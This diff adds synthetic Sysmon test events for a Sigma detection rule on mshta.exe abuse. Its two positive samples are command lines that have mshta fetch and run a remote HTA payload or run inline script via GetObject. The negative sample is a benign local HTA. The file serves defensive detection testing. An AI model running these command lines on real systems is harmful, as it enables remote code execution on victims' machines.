@@ -1,0 +1,28 @@
+# Positive/negative samples for rules/sigma/win_lolbas_mshta_remote_script.yml (synthetic lab events)
+rule: win_lolbas_mshta_remote_script.yml
+positive:
+- name: Remote HTA
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: mshta.exe http://203.0.113.20/payload.hta
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+- name: Inline javascript
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: mshta.exe javascript:a=GetObject('script:x');close()
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+negative:
+- name: Local HTA file
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta.exe C:\Program Files\Vendor\setup.hta'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
